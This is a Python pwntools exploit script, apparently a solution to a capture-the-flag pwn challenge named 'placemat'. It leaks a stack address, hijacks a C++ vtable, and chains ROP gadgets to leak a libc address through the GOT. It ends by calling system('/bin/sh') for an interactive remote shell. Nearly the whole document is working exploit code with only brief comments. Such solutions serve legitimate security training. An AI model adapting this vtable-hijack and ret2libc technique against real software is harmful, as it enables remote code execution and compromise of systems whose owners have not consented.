#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="i386", os="linux")
context.log_level = 'info'

# shortcuts
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)

exe = ELF('./placemat/placemat')
libc = ELF('./libc.so.6')
#rop = ROP(exe)

host, port = "flu.xxx", "11701"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process(exe.path)


player1 = b'A'*1
player2 = b'B'*20


p.sendlineafter(b'3 Exit\n', b'1')
p.sendlineafter(b'(h)uman? ', b'H')
p.sendlineafter(b'Player 1: ', player1)
p.sendlineafter(b'Player 2: ', player2)

# Get leak
p.recvuntil(player2)
stack = int(p.recv(4)[::-1].hex(), 16)
info("Stack: %s" % hex(stack))


# Play dummy round
sla(b'(e.g. A3): ', b'A1')
sla(b'(e.g. A3): ', b'B1')
sla(b'(e.g. A3): ', b'A2')
sla(b'(e.g. A3): ', b'B2')
sla(b'(e.g. A3): ', b'A3')


# Setup vtable hijack
fake_vtable = stack-8  # Points to upcoming player1
info("Fake vtable: %s" % hex(fake_vtable))

pop_ebp = 0x080497f3 # pop ebp ; ret
pop_edi_ebp = 0x0804a460

# read next payload via scanf('%s', stack)
player1 = p32(0x804b226) # <----------- EIP
player1 += b'C'*(16 - len(player1))+p32(pop_ebp)
player1 += p32(fake_vtable) # <------ vtable pointer
#payload2 = b'USELESS' # Dummy

sla(b'3 Exit\n', b'1')
sla(b'(h)uman? ', b'H')
sla(b'Player 1: ', player1)
sla(b'Player 2: ', p32(exe.sym['__isoc99_scanf']+6)+p32(pop_edi_ebp)+p32(0x804c31a)+p32(fake_vtable+0x34))

# next payload leak libc address and read next payload
payload3 = p32(exe.sym['puts'])+p32(pop_ebp)+p32(exe.got['puts'])+p32(exe.sym['__isoc99_scanf']+6)+p32(pop_edi_ebp)+p32(0x804c31a)+p32(fake_vtable+0x50)
sl(payload3)
# get our puts got libc address leak and calculate libc base
p.recvuntil(b'\x20\x0a\x0a\x0a', drop=True)
buff = p.recv()
print(hexdump(buff))
libc.address = u32(buff[0:4])-libc.sym['puts']
print('libc base = '+hex(libc.address))
# next payload --> system('/bin/sh')
payload4 = p32(libc.sym['system'])+p32(libc.sym['exit'])+p32(next(libc.search(b'/bin/sh')))
sl(payload4)

p.interactive()

